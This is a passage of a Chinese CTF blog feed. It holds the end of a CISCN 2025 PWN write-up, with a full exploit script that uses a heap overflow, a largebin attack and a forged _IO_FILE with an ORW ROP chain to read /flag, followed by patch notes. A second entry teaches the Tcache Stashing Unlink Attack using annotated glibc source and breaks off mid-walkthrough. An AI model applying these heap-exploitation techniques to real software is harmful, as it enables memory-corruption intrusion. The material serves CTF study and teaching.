src="/2025/03/19/CISCN-CCB%E5%8D%8A%E5%86%B3%E8%B5%9B2025-PWN-WP/image-20250320143709164.png" alt="image-20250320143709164"></p><p>这里对<code>size</code>没有做大小检查，导致堆溢出，可以通过这一点来泄露地址，然后通过<code>largebin attack</code> 来打<code>io</code></p><h5 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> gt <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> ctf_pb2<br><br>con(<span class="hljs-string">&quot;amd64&quot;</span>)<br><br>io = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size,msg</span>):<br>    proto = ctf_pb2.HeapPayload()<br>    proto.option = <span class="hljs-number">1</span><br>    proto.chunk_sizes.append(size)<br>    proto.heap_chunks_id.append(index)<br>    proto.heap_content = msg<br>    sd = proto.SerializeToString()<br>    io.sendafter(<span class="hljs-string">&quot;Your prompt &gt;&gt; &quot;</span>,p32(<span class="hljs-built_in">len</span>(sd)))<br>    io.send(sd)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    proto = ctf_pb2.HeapPayload()<br>    proto.option = <span class="hljs-number">2</span><br>    proto.chunk_sizes.append(<span class="hljs-number">0</span>)<br>    proto.heap_chunks_id.append(index)<br>    proto.heap_content = <span class="hljs-string">b&#x27;BabyShark&#x27;</span><br>    sd = proto.SerializeToString()<br>    io.sendafter(<span class="hljs-string">&quot;Your prompt &gt;&gt; &quot;</span>,p32(<span class="hljs-built_in">len</span>(sd)))<br>    io.send(sd)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,msg</span>):<br>    proto = ctf_pb2.HeapPayload()<br>    proto.option = <span class="hljs-number">3</span><br>    proto.chunk_sizes.append(size)<br>    proto.heap_chunks_id.append(index)<br>    proto.heap_content = msg<br>    sd = proto.SerializeToString()<br>    io.sendafter(<span class="hljs-string">&quot;Your prompt &gt;&gt; &quot;</span>,p32(<span class="hljs-built_in">len</span>(sd)))<br>    io.send(sd)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    proto = ctf_pb2.HeapPayload()<br>    proto.option = <span class="hljs-number">4</span><br>    proto.chunk_sizes.append(<span class="hljs-number">0</span>)<br>    proto.heap_chunks_id.append(index)<br>    proto.heap_content = <span class="hljs-string">b&#x27;BabyShark&#x27;</span><br>    sd = proto.SerializeToString()<br>    io.sendafter(<span class="hljs-string">&quot;Your prompt &gt;&gt; &quot;</span>,p32(<span class="hljs-built_in">len</span>(sd)))<br>    io.send(sd)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>    proto = ctf_pb2.HeapPayload()<br>    proto.option = <span class="hljs-number">5</span><br>    proto.chunk_sizes.append(<span class="hljs-number">0</span>)<br>    proto.heap_chunks_id.append(<span class="hljs-number">1</span>)<br>    proto.heap_content = <span class="hljs-string">b&#x27;BabyShark&#x27;</span><br>    sd = proto.SerializeToString()<br>    io.sendafter(<span class="hljs-string">&quot;Your prompt &gt;&gt; &quot;</span>,p32(<span class="hljs-built_in">len</span>(sd)))<br>    io.send(sd)<br><br><br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">0x10</span>)<br><br>free(<span class="hljs-number">1</span>)<br>payload = <span class="hljs-string">b&#x27;d&#x27;</span>*<span class="hljs-number">0x100</span> + <span class="hljs-string">b&#x27;e&#x27;</span>*<span class="hljs-number">0x10</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>show(<span class="hljs-number">0</span>)<br>io.recvuntil(<span class="hljs-string">&quot;e&quot;</span>*<span class="hljs-number">0x10</span>)<br>heap_base = u64(io.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap_base = (heap_base &lt;&lt; <span class="hljs-number">12</span>) - <span class="hljs-number">0x7000</span><br>suc(<span class="hljs-string">&quot;heap_base&quot;</span>,heap_base)<br><span class="hljs-comment"># gdb.attach(io)</span><br>payload = <span class="hljs-string">b&#x27;d&#x27;</span>*<span class="hljs-number">0x100</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x111</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x10</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(i+<span class="hljs-number">3</span>,<span class="hljs-number">0x210</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x210</span>,<span class="hljs-string">b&#x27;2&#x27;</span>*<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">11</span>,<span class="hljs-number">0x210</span>,<span class="hljs-string">b&#x27;b&#x27;</span>)<br>add(<span class="hljs-number">12</span>,<span class="hljs-number">0x210</span>,<span class="hljs-string">b&#x27;b&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    free(i+<span class="hljs-number">3</span>)<br><br>free(<span class="hljs-number">11</span>)<br>payload = <span class="hljs-string">b&#x27;2&#x27;</span>*<span class="hljs-number">0x210</span> + <span class="hljs-string">b&#x27;3&#x27;</span> * <span class="hljs-number">0x10</span><br>edit(<span class="hljs-number">10</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>show(<span class="hljs-number">10</span>)<br>io.recvuntil(<span class="hljs-string">&quot;3&quot;</span>*<span class="hljs-number">0x10</span>)<br>libc_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) -<span class="hljs-number">0x203d30</span><br><br>suc(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br>payload = <span class="hljs-string">b&#x27;2&#x27;</span>*<span class="hljs-number">0x210</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x221</span>)<br>edit(<span class="hljs-number">10</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>_IO_list_all = libc_base + libc.sym[<span class="hljs-string">&quot;_IO_list_all&quot;</span>] <br>_IO_wfile_jumps = libc_base + libc.sym[<span class="hljs-string">&quot;_IO_wfile_jumps&quot;</span>]<br>setcontext = libc_base + libc.sym[<span class="hljs-string">&quot;setcontext&quot;</span>]<br>_IO_2_1_stderr_ = libc_base + libc.sym[<span class="hljs-string">&quot;_IO_2_1_stderr_&quot;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    free(i)<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x440</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x430</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x430</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x340</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x440</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x440</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x450</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x440</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x1f0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>free(<span class="hljs-number">5</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x440</span> + p64(<span class="hljs-number">0x8a0</span>) + p64(<span class="hljs-number">0x451</span>) + p64(libc_base + <span class="hljs-number">0x203f20</span>)*<span class="hljs-number">2</span> + p64(_IO_list_all-<span class="hljs-number">0x20</span>)*<span class="hljs-number">2</span><br>fake_io_addr = heap_base +  <span class="hljs-number">0x5d90</span><br>gdb.attach(io)<br>edit(<span class="hljs-number">4</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x430</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x440</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x451</span>) + p64(libc_base + <span class="hljs-number">0x203f20</span>)*<span class="hljs-number">2</span> + p64(fake_io_addr)*<span class="hljs-number">2</span><br><br>edit(<span class="hljs-number">4</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>add(<span class="hljs-number">11</span>,<span class="hljs-number">0x430</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br><br><span class="hljs-comment"># add(3,0x10,b&#x27;\x00&#x27;)</span><br><span class="hljs-comment"># gdb.attach(io)</span><br><span class="hljs-comment"># add(1,0x310,p64(fake_io_addr))</span><br>pop_rdi = libc_base + <span class="hljs-number">0x000000000010f75b</span><span class="hljs-comment">#: pop rdi; ret; </span><br>pop_rsi = libc_base + <span class="hljs-number">0x0000000000110a4d</span><span class="hljs-comment">#: pop rsi; ret; </span><br>pop_rax = libc_base + <span class="hljs-number">0x00000000000dd237</span><span class="hljs-comment">#: pop rax; ret; </span><br>syscall = libc_base + <span class="hljs-number">0x0000000000098fb6</span><span class="hljs-comment">#: syscall; ret; </span><br>sendfile = libc_base + libc.sym[<span class="hljs-string">&quot;sendfile&quot;</span>]<br>pop_rcx = libc_base + <span class="hljs-number">0x00000000000a877e</span><span class="hljs-comment">#: pop rcx; ret; </span><br><br><br><br><br>orw_addr = fake_io_addr + <span class="hljs-number">0x150</span><br>fake_IO_FILE=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>       <span class="hljs-comment">#_flags=rdi</span><br>fake_IO_FILE+=p64(_IO_list_all) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>fake_IO_FILE +=p64(<span class="hljs-number">1</span>)+p64(<span class="hljs-number">2</span>) <span class="hljs-comment"># rcx!=0(FSOP)</span><br>fake_IO_FILE +=p64(fake_io_addr+<span class="hljs-number">0xb0</span>)<span class="hljs-comment">#_IO_backup_base=rdx</span><br>fake_IO_FILE +=p64(setcontext+<span class="hljs-number">61</span>)<span class="hljs-comment">#_IO_save_end=call addr(call setcontext/system) mov rdx, qword ptr [rax + 0x38]; mov rdi, rax; call qword ptr [rdx + 0x20]; </span><br>fake_IO_FILE +=p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>) + p64(orw_addr-<span class="hljs-number">0x20</span>) <span class="hljs-comment"># rdx</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _chain</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x78</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(heap_base+<span class="hljs-number">0x2000</span>)  <span class="hljs-comment"># _lock = a writable address</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x90</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE +=p64(fake_io_addr+<span class="hljs-number">0x30</span>)<span class="hljs-comment">#_wide_data,rax1_addr</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xb0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">1</span>) <span class="hljs-comment">#mode=1</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(_IO_wfile_jumps+<span class="hljs-number">0x30</span>)  <span class="hljs-comment"># vtable=IO_wfile_jumps+0x10</span><br>fake_IO_FILE +=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span><br>fake_IO_FILE += p64(fake_io_addr+<span class="hljs-number">0x40</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span> + p64(orw_addr+<span class="hljs-number">8</span>) + p64(pop_rdi+<span class="hljs-number">1</span>)<br>flag_addr = orw_addr + <span class="hljs-number">0x80</span><br>orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rax) + p64(<span class="hljs-number">2</span>) + p64(syscall)<br>orw += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(<span class="hljs-number">3</span>) + p64(pop_rcx)+ p64(<span class="hljs-number">0x40</span>)+p64(sendfile) + <span class="hljs-string">b&quot;/flag\x00&quot;</span><br><br>fake_IO_FILE += orw<br><br>edit(<span class="hljs-number">11</span>,<span class="hljs-built_in">len</span>(fake_IO_FILE),fake_IO_FILE)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">pop_rdi = libc_base + 0x000000000010f75b#: pop rdi; ret; </span><br><span class="hljs-string">pop_rsi = libc_base + 0x0000000000110a4d#: pop rsi; ret; </span><br><span class="hljs-string">pop_rax = libc_base + 0x00000000000dd237#: pop rax; ret; </span><br><span class="hljs-string">syscall = libc_base + 0x0000000000098fa6#: syscall; ret; </span><br><span class="hljs-string">sendfile = libc_base + libc.sym[&quot;sendfile&quot;]</span><br><span class="hljs-string">pop_rcx = libc_base + 0x00000000000a876e#: pop rcx; ret; </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># gdb.attach(io)</span><br>exit()<br>io.interactive()<br>    <br><br><br></code></pre></td></tr></table></figure><p><img src="/2025/03/19/CISCN-CCB%E5%8D%8A%E5%86%B3%E8%B5%9B2025-PWN-WP/image-20250320144010037.png" alt="image-20250320144010037"></p><h4 id="fix-1"><a href="#fix-1" class="headerlink" title="fix"></a>fix</h4><p>将n该小即可防止溢出</p><p><img src="/2025/03/19/CISCN-CCB%E5%8D%8A%E5%86%B3%E8%B5%9B2025-PWN-WP/image-20250320144050844.png" alt="image-20250320144050844"></p><h4 id="post-quantum"><a href="#post-quantum" class="headerlink" title="post_quantum"></a>post_quantum</h4><h5 id="fix-2"><a href="#fix-2" class="headerlink" title="fix"></a>fix</h5><p>这个我看网上修的方法有很多，这里是把解密函数的两个<code>free</code>给<code>ban</code>了</p>]]></content>
    
    
    
    <tags>
      
      <tag>PWN_WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常回家看看之Tcache_Stashing_Unlink_Attack</title>
    <link href="/2024/12/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8BTcache-Stashing-Unlink-Attack/"/>
    <url>/2024/12/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8BTcache-Stashing-Unlink-Attack/</url>
    
    <content type="html"><![CDATA[<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>在开始了解这个攻击手法的前提，需要先了解一个函数也就是<strong>calloc函数</strong>，众所周知，当libc版本大于等于2.27的时候会引入tcachebin，而Tcache Stashing Unlink Attack就是发生在<strong>2.27版本以上</strong>，那么这个和calloc有什么关系呢，周知所众，当tcahchebin里面有符合条件的空闲堆块的时候，malloc会优先去tcachebin里面拿堆块，然而calloc不是这样，它会越过tcachebin来拿取堆块，这个特殊的机制，还有接下来的一个<strong>忽略的检查</strong>导致Tcache Stashing Unlink Attack的发生</p><h2 id="smallbin："><a href="#smallbin：" class="headerlink" title="smallbin："></a><strong>smallbin：</strong></h2><p>当tcachebin里面的chunk不满，而smallbin里面有两个及以上的堆块的时候，通过calloc申请chunk的时候会取smallbin里面的chunk，因为此时的tcachebin不满，那么剩下的smallbin会放入tachchebin中，而这其中只对放入tcachebin的第一个chunk做了检查，那么可以把第二个chunk的bk指针进行修改，那么到tcachebin之后最后的fake_chunk的fd既可以执行main_arena+96的位置，当然在一些情况下还可以直接进入tcachebin伪造chunk</p><p>具体的漏洞源码和解释引用一下zikh26师傅的博客<a href="https://zikh26.github.io/posts/12414989.html#buu-2020-%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%98-3">关于tcache stashing unlink attack的学习总结 | ZIKH26’s Blog</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>    &#123;<br>      idx = smallbin_index (nb);<br>      bin = bin_at (av, idx);<br><br>      <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin)<br>      <span class="hljs-comment">//victim就是要脱链的堆块，也就是small bin里的最后一个</span><br>      <span class="hljs-comment">//这个if在判断我们所需要的size的那条small bin链上是否存在堆块，存在的话就把victim给脱链</span><br>        &#123;<br>          bck = victim-&gt;bk;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<span class="hljs-comment">//对small bin的双向链表的完整性做了检查，确保victim-&gt;bk-&gt;fd指向的还是victim</span><br>    <span class="hljs-comment">//如果我们在这里劫持了victim的bk指针，就会导致bck的fd指向的并不是victim，从而触发异常</span><br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);<br>          set_inuse_bit_at_offset (victim, nb);<span class="hljs-comment">//设置下一个（高地址）chunk的prev_inuse位</span><br>          bin-&gt;bk = bck;<span class="hljs-comment">//将victim脱链</span><br>          bck-&gt;fd = bin;<br>          <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>    set_non_main_arena (victim);<br>          check_malloced_chunk (av, victim, nb);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment">     stash them in the tcache.  */</span><br>  <span class="hljs-type">size_t</span> tc_idx = csize2tidx (nb);<span class="hljs-comment">//获取size对应的tcache索引</span><br>  <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<span class="hljs-comment">//如果这个索引在tcache bin的范围里，也就是这个size属于tcache bin的范围</span><br>    &#123;<br>      mchunkptr tc_victim;<br><br>      <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span><br>      <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<span class="hljs-comment">//如果tcache bin没有满</span><br>     &amp;&amp; (tc_victim = last (bin)) != bin)<span class="hljs-comment">//如果small bin不为空,tc_victim为small bin中的最后一个堆块</span><br>&#123;<br>  <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)<br>    &#123;<br>      bck = tc_victim-&gt;bk;<span class="hljs-comment">//这里取tc_victim的bk指针，并没有针对bck做双向链表完整性检查，因此我们可以去攻击tc_victim的bk指针</span><br>      set_inuse_bit_at_offset (tc_victim, nb);<br>      <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>set_non_main_arena (tc_victim);<br>      bin-&gt;bk = bck;<span class="hljs-comment">//将tc_victim从small bin中脱链</span><br>      bck-&gt;fd = bin;<span class="hljs-comment">//如果我们伪造bck，这里就可以将bck-&gt;fd的位置写入一个bin的地址(main_arena+96)</span><br>      tcache_put (tc_victim, tc_idx);<span class="hljs-comment">//将tc_victim链入tc_idx这条链</span><br>            &#125;<br>&#125;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>          <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>          alloc_perturb (p, bytes);<br>          <span class="hljs-keyword">return</span> p;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h2><h2 id="蜀道山smash"><a href="#蜀道山smash" class="headerlink" title="蜀道山smash"></a>蜀道山smash</h2><p>保护策略</p><p><img src="/2024/12/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8BTcache-Stashing-Unlink-Attack/3419447-20241213185442313-978507536.png" alt="img"></p><p>ida逆向分析</p><p><img src="/2024/12/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8BTcache-Stashing-Unlink-Attack/3419447-20241213185814469-1811310535.png" alt="img"></p><p>这里是开启了沙箱，可以先看看规则</p><p><img src="/2024/12/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8BTcache-Stashing-Unlink-Attack/3419447-20241213185849470-615738866.png" alt="img"></p><p>禁用了execv以及open，那么还可以使用openat来进行orw读取flag</p><p>有个堆菜单</p><p><img src="/2024/12/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8BTcache-Stashing-Unlink-Attack/3419447-20241213190325528-857575723.png" alt="img"></p><p>有个选项5，是存在溢出的</p><p><img src="/2024/12/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8BTcache-Stashing-Unlink-Attack/3419447-20241213190349724-271181013.png" alt="img"></p><p>但是因为这个位置一开始是0的导致读入字节为0</p><p>但是又发现add函数是使用的calloc，那么可以考虑使用Tcache Stashing Unlink Attack来将此处写入main_arena+96很大的一个地址</p><p>那么造成栈溢出，正常rop即可</p><p><img src="/2024/12/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8BTcache-Stashing-Unlink-Attack/3419447-20241213190543344-1951216088.png" alt="img"></p><p>free函数存在uaf漏洞，那么可以泄露libc和heap地址</p><p><img src="/2024/12/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8BTcache-Stashing-Unlink-Attack/3419447-20241213191416910-234993001.png" alt="img"></p><p>这里使用的0x100的堆块，那么就要伪造堆块，修改第一个堆块的bk指针</p><p>这里伪造的堆块是紧邻着修改chunk的上一个chunk</p><p><img src="/2024/12/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8BTcache-Stashing-Unlink-Attack/3419447-20241213192409131-103701433.png" alt="img"></p><p><img src="/2024/12/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8BTcache-Stashing-Unlink-Attack/3419447-20241213192425566-1395130046.png" alt="img"></p><p>接下来继续伪造堆块，size位和bk指针</p><p><img src="/2024/12/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8BTcache-Stashing-Unlink-Attack/3419447-20241213192903328-115086102.png" alt="img"></p><p>继续使用calloc申请一个堆块，那么即可触发Tcache Stashing Unlink Attack</p><p><img 